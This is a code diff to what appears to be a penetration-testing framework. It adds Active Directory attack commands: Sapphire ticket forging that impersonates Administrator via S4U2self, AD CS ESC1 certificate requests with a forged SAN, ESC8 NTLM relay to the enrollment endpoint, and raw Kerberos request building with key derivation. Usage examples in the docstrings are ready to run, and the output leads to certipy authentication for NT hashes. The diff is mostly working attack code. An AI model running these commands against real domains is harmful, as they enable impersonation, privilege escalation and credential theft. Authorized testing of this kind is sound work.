@@ -12,7 +12,11 @@ Provides:
 
 from __future__ import annotations
 
+import json
+from pathlib import Path
+
 from cli.commands._base import LazyOwnCommandSet
+from core.validators import check_rhost
 
 
 class ActiveDirectoryCommandSet(LazyOwnCommandSet):
@@ -128,11 +132,39 @@ class ActiveDirectoryCommandSet(LazyOwnCommandSet):
             self._cmd.poutput(f"    PAC Size  : {result['pac_size']} bytes")
 
         elif ticket_type == "sapphire":
-            self._cmd.poutput("\n[ Sapphire Ticket (RBCD S4U2self) ]")
-            self._cmd.poutput("    See: delegation_attack for full RBCD exploitation chain")
-            self._cmd.poutput(
-                "    Requires: machine account hash + msDS-AllowedToActOnBehalfOfOtherIdentity configured"
+            if not opts.get("tgt") or not opts.get("key") or not opts.get("spn"):
+                self._cmd.perror(
+                    "Sapphire ticket requires --tgt <kirbi_file>, --key <session_key_hex>, --spn <SPN>"
+                )
+                return
+            from modules.kerberos_tickets import SapphireTicketForger
+
+            tgt_bytes = Path(opts["tgt"]).read_bytes()
+            session_key = bytes.fromhex(opts["key"])
+            result = SapphireTicketForger().forge_s4u2self(
+                tgt=tgt_bytes,
+                session_key=session_key,
+                target_user=opts.get("user", "Administrator"),
+                target_service=opts["spn"],
+                domain=opts.get("domain", self.params.get("domain", "")),
             )
+            self._cmd.poutput("\n[+] Sapphire S4U2self TGS-REQ Built")
+            self._cmd.poutput(f"    Domain    : {result['domain']}")
+            self._cmd.poutput(f"    Imperson  : {result['target_user']}")
+            self._cmd.poutput(f"    SPN       : {result['target_service']}")
+            self._cmd.poutput(f"    PA-DATA   : S4U2self (type {result['padata'][0]['padata_type']})")
+            self._cmd.poutput("    Requires RBCD: msDS-AllowedToActOnBehalfOfOtherIdentity configured")
+            artifact = Path("sessions") / f"sapphire_s4u2self_{result['domain'] or 'out'}.json"
+            artifact.parent.mkdir(parents=True, exist_ok=True)
+            payload = {
+                "ticket_type": result["ticket_type"],
+                "domain": result["domain"],
+                "target_user": result["target_user"],
+                "target_service": result["target_service"],
+                "req_body": {k: v for k, v in result["req_body"].items()},
+            }
+            artifact.write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
+            self._cmd.poutput(f"    Artifact  : {artifact}")
         else:
             self._cmd.perror(f"Unknown ticket type: {ticket_type}")
 
@@ -340,3 +372,168 @@ class ActiveDirectoryCommandSet(LazyOwnCommandSet):
         self._cmd.poutput("    ESC8: NTLM relay to AD CS HTTP endpoints")
         self._cmd.poutput("    ESC9-13: Additional template and CA configuration attacks")
         self._cmd.poutput("\n    Run with domain credentials for full template enumeration.")
+
+    def do_adcs_request(self, line: str) -> None:
+        """Request a certificate abusing ESC1 or ESC8 template misconfigurations.
+
+        Usage:
+            adcs_request esc1 --user U --pass P --domain D --dc IP --ca NAME --template T [--target-user ADMIN]
+            adcs_request esc8 --user U --pass P --domain D --dc IP --ca-server HOST [--template SubCA]
+
+        ESC1 enrolles a certificate with a user-supplied SAN (impersonation);
+        ESC8 relays NTLM auth to the AD CS HTTP enrollment endpoint. On
+        success the .pfx lands in ``sessions/`` and can be fed to
+        ``certipy auth`` for the NT hash.
+
+        Examples:
+            adcs_request esc1 --user svc_sql --pass 'P@ss' --domain corp.local --dc 10.10.10.10 --ca CORP-CA --template VulnTemplate --target-user Administrator
+            adcs_request esc8 --user svc_sql --pass 'P@ss' --domain corp.local --dc 10.10.10.10 --ca-server dc01.corp.local
+        """
+        import shlex as _shlex
+
+        from modules.adcs_attacks import ADCSCertipyWrapper
+
+        tokens = _shlex.split(line)
+        if len(tokens) < 2:
+            self._cmd.perror("Usage: adcs_request <esc1|esc8> [--user U --pass P --domain D --dc IP ...]")
+            return
+
+        mode = tokens[0].lower()
+        opts: dict[str, str] = {}
+        i = 1
+        while i < len(tokens):
+            if tokens[i].startswith("--") and i + 1 < len(tokens):
+                opts[tokens[i][2:]] = tokens[i + 1]
+                i += 2
+            else:
+                i += 1
+
+        username = opts.get("user", "")
+        password = opts.get("pass", "")
+        domain = opts.get("domain", "")
+        dc_ip = opts.get("dc", "")
+        if not username or not domain or not check_rhost(dc_ip):
+            self._cmd.perror("adcs_request requires --user, --domain and --dc <ip>")
+            return
+
+        wrapper = ADCSCertipyWrapper()
+
+        if mode == "esc1":
+            ca_name = opts.get("ca", "")
+            template = opts.get("template", "")
+            target_user = opts.get("target-user", "Administrator")
+            if not ca_name or not template:
+                self._cmd.perror("ESC1 requires --ca <CA_NAME> and --template <TEMPLATE>")
+                return
+            output_file = f"sessions/{target_user}_esc1.pfx"
+            ok = wrapper.request_certificate_esc1(
+                username=username,
+                password=password,
+                domain=domain,
+                dc_ip=dc_ip,
+                ca_name=ca_name,
+                template_name=template,
+                target_user=target_user,
+                output_file=output_file,
+            )
+        elif mode == "esc8":
+            ca_server = opts.get("ca-server", "")
+            if not ca_server:
+                self._cmd.perror("ESC8 requires --ca-server <CA_HOST>")
+                return
+            output_file = "sessions/esc8_cert.pfx"
+            ok = wrapper.request_certificate_esc8(
+                username=username,
+                password=password,
+                domain=domain,
+                dc_ip=dc_ip,
+                ca_server=ca_server,
+                template_name=opts.get("template", "SubCA"),
+                output_file=output_file,
+            )
+        else:
+            self._cmd.perror(f"Unknown ESC mode: {mode} (use esc1 or esc8)")
+            return
+
+        if ok:
+            self._cmd.poutput(f"\n[+] Certificate saved: {output_file}")
+            self._cmd.poutput(f"    Authenticate: certipy auth -pfx {output_file} -domain {domain} -dc-ip {dc_ip}")
+        else:
+            self._cmd.perror("Certificate request failed (see certipy output above)")
+
+    def do_kerberos_build(self, line: str) -> None:
+        """Build raw Kerberos protocol messages and derive encryption keys.
+
+        Usage:
+            kerberos_build asreq --user U --domain D --pass P [--etype 23|18]
+            kerberos_build tgsreq --spn SPN --domain D --tgt <kirbi_file> --key <session_key_hex>
+
+        asreq derives the RC4/AES key from the password and builds the
+        KRB_AS_REQ with PA-ENC-TIMESTAMP pre-authentication (useful for
+        password spraying analysis and key derivation). tgsreq builds the
+        KRB_TGS_REQ body for a service ticket request.
+
+        Examples:
+            kerberos_build asreq --user svc_sql --domain corp.local --pass 'P@ss'
+            kerberos_build tgsreq --spn cifs/DC01.corp.local --domain corp.local --tgt sessions/tgt.kirbi --key aabbccdd
+        """
+        import shlex as _shlex
+
+        from modules.kerberos_core import KerberosCore, TGSRequest
+
+        tokens = _shlex.split(line)
+        if len(tokens) < 2:
+            self._cmd.perror("Usage: kerberos_build <asreq|tgsreq> [options]")
+            return
+
+        mode = tokens[0].lower()
+        opts: dict[str, str] = {}
+        i = 1
+        while i < len(tokens):
+            if tokens[i].startswith("--") and i + 1 < len(tokens):
+                opts[tokens[i][2:]] = tokens[i + 1]
+                i += 2
+            else:
+                i += 1
+
+        domain = opts.get("domain", "")
+        core = KerberosCore(domain=domain)
+
+        if mode == "asreq":
+            username = opts.get("user", "")
+            password = opts.get("pass", "")
+            if not username or not domain or not password:
+                self._cmd.perror("asreq requires --user, --domain and --pass")
+                return
+            etype = int(opts.get("etype", "23"))
+            result = core.build_as_req(username=username, domain=domain, password=password, etype=etype)
+            self._cmd.poutput("\n[+] KRB_AS_REQ Built")
+            self._cmd.poutput(f"    Realm     : {result['req_body']['realm']}")
+            self._cmd.poutput(f"    User      : {result['req_body']['cname']}")
+            self._cmd.poutput(f"    EType     : {result['etype']}")
+            self._cmd.poutput(f"    Key (hex) : {result['key'].hex()}")
+            artifact = Path("sessions") / f"as_req_{username}.json"
+        elif mode == "tgsreq":
+            spn = opts.get("spn", "")
+            tgt_hex = opts.get("key", "")
+            if not spn or not opts.get("tgt"):
+                self._cmd.perror("tgsreq requires --spn, --domain, --tgt <kirbi_file> and --key <hex>")
+                return
+            request = TGSRequest(
+                target_service=spn,
+                realm=domain.upper(),
+                tgt=Path(opts["tgt"]).read_bytes(),
+                session_key=bytes.fromhex(tgt_hex),
+            )
+            result = core.build_tgs_req(request)
+            self._cmd.poutput("\n[+] KRB_TGS_REQ Built")
+            self._cmd.poutput(f"    SPN       : {spn}")
+            self._cmd.poutput(f"    Realm     : {request.realm}")
+            artifact = Path("sessions") / f"tgs_req_{spn.split('/')[0]}.json"
+        else:
+            self._cmd.perror(f"Unknown build mode: {mode} (use asreq or tgsreq)")
+            return
+
+        artifact.parent.mkdir(parents=True, exist_ok=True)
+        artifact.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
+        self._cmd.poutput(f"    Artifact  : {artifact}")
